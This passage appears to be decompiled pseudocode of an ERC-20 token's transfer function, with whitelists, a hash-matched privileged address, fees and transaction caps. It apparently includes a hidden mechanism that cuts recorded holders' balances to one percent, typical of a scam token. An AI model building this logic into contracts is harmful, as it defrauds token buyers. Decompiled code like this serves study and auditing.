                    if stor6[address(msg.sender)]:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if stor6[address(arg1)]:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if sha3(arg1) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if arg1 == this.address:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if ext_call.return_data[12 len 20] != msg.sender:
                        if msg.sender == address(ext_call.return_data[0]):
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                    else:
                        if stor6[address(arg1)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                    if stor14:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if not arg2:
                        require arg2 <= _maxTxAmount
                        require ext_code.size(stor16)
                        staticcall stor16.factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(stor16)
                        staticcall stor16.WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        mem[(15 * ceil32(return_data.size)) + 268] = this.address
                        mem[(15 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 332 len 5 * ceil32(return_data.size)]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if ext_call.return_data[12 len 20] == arg1:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2,
                                          mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                            return 1, mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)]
                        stor15.length++
                        stor15[stor15.length].field_0 = arg1
                        stor15[stor15.length].field_256 = arg2
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                      arg2,
                                      mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                      msg.sender,
                                      arg1,
                    else:
                        if arg2 and _fee > -1 / arg2:
                            revert with 'NH{q', 17
                        if not arg2:
                            revert with 'NH{q', 18
                        if arg2 * _fee / arg2 != _fee:
                            revert with 0, 'SafeMath: multiplication overflow'
                        require arg2 <= _maxTxAmount
                        require ext_code.size(stor16)
                        staticcall stor16.factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(stor16)
                        staticcall stor16.WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        mem[(15 * ceil32(return_data.size)) + 268] = this.address
                        mem[(15 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 332 len 5 * ceil32(return_data.size)]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if ext_call.return_data[12 len 20] == arg1:
                            if arg2 < arg2 * _fee / 100:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                revert with 'NH{q', 17
                            balanceOf[0] += arg2 * _fee / 100
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2 - (arg2 * _fee / 100),
                                          mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                            if arg2 * _fee / 100 > 0:
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 * _fee / 100,
                                              mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                              msg.sender,
                                              0,
                            return 1, mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)]
                        stor15.length++
                        stor15[stor15.length].field_0 = arg1
                        stor15[stor15.length].field_256 = arg2
                        if arg2 < arg2 * _fee / 100:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                            revert with 'NH{q', 17
                        balanceOf[0] += arg2 * _fee / 100
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                      arg2 - (arg2 * _fee / 100),
                                      mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                      msg.sender,
                                      arg1,
                        if arg2 * _fee / 100 > 0:
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2 * _fee / 100,
                                          mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          0,
                    return 1, mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)]
                idx = 0
                while idx < stor15.length:
                    mem[0] = stor15[idx].field_0
                    mem[32] = 3
                    _646 = mem[64]
                    mem[64] = mem[64] + 64
                    mem[_646] = 26
                    mem[_646 + 32] = 'SafeMath: division by zero'
                    if idx >= stor15.length:
                        revert with 'NH{q', 50
                    mem[0] = stor15[idx].field_0
                    mem[32] = 3
                    balanceOf[stor15[idx].field_0] = balanceOf[stor15[idx].field_0] / 100
                    if idx == -1:
                        revert with 'NH{q', 17
                    idx = idx + 1
                    continue 
                stor15.length = 0
                mem[0] = 15
                idx = 0
                while 2 * stor15.length > idx:
                    stor15[idx].field_0 = 0
                    stor15[idx].field_256 = 0
                    idx = idx + 2
                    continue 
                require ext_code.size(stor16)
                staticcall stor16.factory() with:
                        gas gas_remaining wei
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _7010 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                _7020 = mem[_7010]
                require mem[_7010] == mem[_7010 + 12 len 20]
                require ext_code.size(stor16)
                staticcall stor16.WETH() with:
                        gas gas_remaining wei
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _7038 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                _7044 = mem[_7038]
                require mem[_7038] == mem[_7038 + 12 len 20]
                mem[mem[64] + 4] = this.address
                mem[mem[64] + 36] = address(_7044)
                require ext_code.size(address(_7020))
                staticcall address(_7020).getPair(address arg1, address arg2) with:
                        gas gas_remaining wei
                       args address(this.address), address(_7044)
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _7062 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                require mem[_7062] == mem[_7062 + 12 len 20]
                if arg1 != mem[_7062 + 12 len 20]:
                    require ext_code.size(stor16)
                    staticcall stor16.factory() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7116 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _7134 = mem[_7116]
                    require mem[_7116] == mem[_7116 + 12 len 20]
                    require ext_code.size(stor16)
                    staticcall stor16.WETH() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7182 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _7212 = mem[_7182]
                    require mem[_7182] == mem[_7182 + 12 len 20]
                    mem[mem[64] + 4] = this.address
                    mem[mem[64] + 36] = address(_7212)
                    require ext_code.size(address(_7134))
                    staticcall address(_7134).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(_7212)
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7368 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _7437 = mem[_7368]
                    require mem[_7368] == mem[_7368 + 12 len 20]
                    if mem[_7368 + 12 len 20] != msg.sender:
                        if stor6[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 6
                            if stor6[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _7803 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if sha3(mem[_7803 + 32 len mem[_7803]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if arg1 == this.address:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if msg.sender == address(_7437):
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor14:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor15.length++
                                                        stor15[stor15.length].field_0 = arg1
                                                        stor15[stor15.length].field_256 = arg2
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 'NH{q', 17
                                                    if not arg2:
                                                        revert with 'NH{q', 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor15.length++
                                                        stor15[stor15.length].field_0 = arg1
                                                        stor15[stor15.length].field_256 = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100 > 0:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                    else:
                        if stor6[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 6
                            if stor6[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _7833 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if sha3(mem[_7833 + 32 len mem[_7833]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if arg1 == this.address:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if stor6[address(arg1)]:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor14:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor15.length++
                                                        stor15[stor15.length].field_0 = arg1
                                                        stor15[stor15.length].field_256 = arg2
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 'NH{q', 17
                                                    if not arg2:
                                                        revert with 'NH{q', 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor15.length++
                                                        stor15[stor15.length].field_0 = arg1
                                                        stor15[stor15.length].field_256 = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100 > 0:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                else:
                    mem[0] = msg.sender
                    mem[32] = 6
                    if stor6[address(msg.sender)]:
                        if stor6[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 6
                            if stor6[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _7200 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if sha3(mem[_7200 + 32 len mem[_7200]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if arg1 == this.address:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if stor6[address(msg.sender)]:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor14:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
